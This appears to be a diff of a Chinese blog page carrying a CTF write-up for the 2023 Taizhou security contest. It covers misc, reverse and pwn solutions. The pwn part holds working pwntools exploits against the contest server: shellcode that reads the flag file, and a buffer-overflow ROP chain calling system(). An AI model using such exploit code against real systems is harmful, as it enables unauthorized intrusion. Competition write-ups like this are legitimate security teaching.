+<h2 id="Black-Mamba"><a href="#Black-Mamba" class="headerlink" title="Black Mamba"></a>Black Mamba</h2><p>iend后有冗余数据，提取出来后异或24</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    f.write(<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">24</span>]))<br>f.close()<br></code></pre></td></tr></table></figure>
+
+<p>异或后是压缩包，hint是<code>说了很多次不要用这么常见的密码了</code></p>
+<p>掏出祖传的字典爆破，得到<code>1qaz@WSX</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png"></p>
+<p>解压后是</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">EAOJYU?TRX&gt;&#123;XPFABY&#123;<span class="hljs-number">8</span>&#123;<span class="hljs-number">24</span>+<br>有人好像对我键盘做了点手脚，看起来像坏了一样。<br></code></pre></td></tr></table></figure>
+
+<p>Dvorak解码得到<code>DASCTF&#123;KOBE_BRYANT_8_24&#125;</code></p>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="rrrrs"><a href="#rrrrs" class="headerlink" title="rrrrs"></a>rrrrs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a</span>):<br>    a^=a&gt;&gt;<span class="hljs-number">18</span><br>    a^=(a&lt;&lt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">0xefc60000</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        a^=((a&amp;(<span class="hljs-number">127</span>&lt;&lt;(<span class="hljs-number">7</span>*i)))&lt;&lt;<span class="hljs-number">7</span>)&amp;(<span class="hljs-number">0x9d2c5680</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        a^=(a&amp;(<span class="hljs-number">4292870144</span>&gt;&gt;(<span class="hljs-number">11</span>*i)))&gt;&gt;<span class="hljs-number">11</span><br>    <span class="hljs-keyword">return</span> a.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>c=[<br><span class="hljs-number">0xa7a1e601</span>,<br><span class="hljs-number">0x10a6a5df</span>,<br><span class="hljs-number">0xa3f03b11</span>,<br><span class="hljs-number">0x7e523d64</span>,<br><span class="hljs-number">0xcb99d7a8</span>,<br><span class="hljs-number">0x2ddc2485</span>,<br><span class="hljs-number">0xe3c8b3cd</span>,<br><span class="hljs-number">0x6b82a51e</span>,<br><span class="hljs-number">0x0ea07814</span>,<br><span class="hljs-number">0x6bf2bf07</span>]<br>flag=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    flag+=decode(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="hljs-string">&quot;21844&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;babyshell&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>shellcode=shellcraft.openat(-<span class="hljs-number">100</span>,<span class="hljs-string">&quot;flag&quot;</span>)<br>shellcode+=shellcraft.brk()<br>shellcode+=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">sub rsi,0x1000</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="mercedes"><a href="#mercedes" class="headerlink" title="mercedes"></a>mercedes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-string">&#x27;28629&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;mercedes&quot;</span>)<br>context.binary=e<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>comm=<span class="hljs-number">0x601090</span><br>rdi=<span class="hljs-number">0x0000000000400983</span><br>ret=<span class="hljs-number">0x00000000004005ae</span><br>p.sendafter(<span class="hljs-string">&#x27;drink&#x27;</span>,<span class="hljs-string">&#x27;tac flag 1&gt;&amp;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;you?&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(rdi)+p64(comm)+p64(ret)+p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
               
             </div>
             <hr/>
@@ -581,7 +373,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="category-chain-item">应急响应</a>
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
   
   
 
@@ -596,9 +388,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/hw/">#hw</a>
+        <a href="/tags/wp/">#wp</a>
       
-        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">#应急响应</a>
+        <a href="/tags/%E5%8F%B0%E5%B7%9E/">#台州</a>
       
     </div>
   
@@ -610,8 +402,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>应急响应中的常用命令</div>
-      <div>https://www.lewiserii.top/hw/应急响应中的常用命令.html</div>
+      <div>2023台州市第三届网络安全大赛wp</div>
+      <div>https://www.lewiserii.top/竞赛/2023台州市第三届网络安全大赛wp.html</div>
     </div>
     <div class="license-meta">
       
@@ -623,7 +415,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月18日</div>
+          <div>2023年9月27日</div>
         </div>
       
       
@@ -665,18 +457,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bwp.html" title="2023羊城杯初赛misc&amp;web wp">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">2023羊城杯初赛misc&amp;web wp</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html" title="2023ciscn初赛wp">
-                        <span class="hidden-mobile">2023ciscn初赛wp</span>
+                      <a href="/%E7%AB%9E%E8%B5%9B/2023%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9Bwp.html" title="2023羊城杯决赛web Break&amp;Fix wp">
+                        <span class="hidden-mobile">2023羊城杯决赛web Break&amp;Fix wp</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
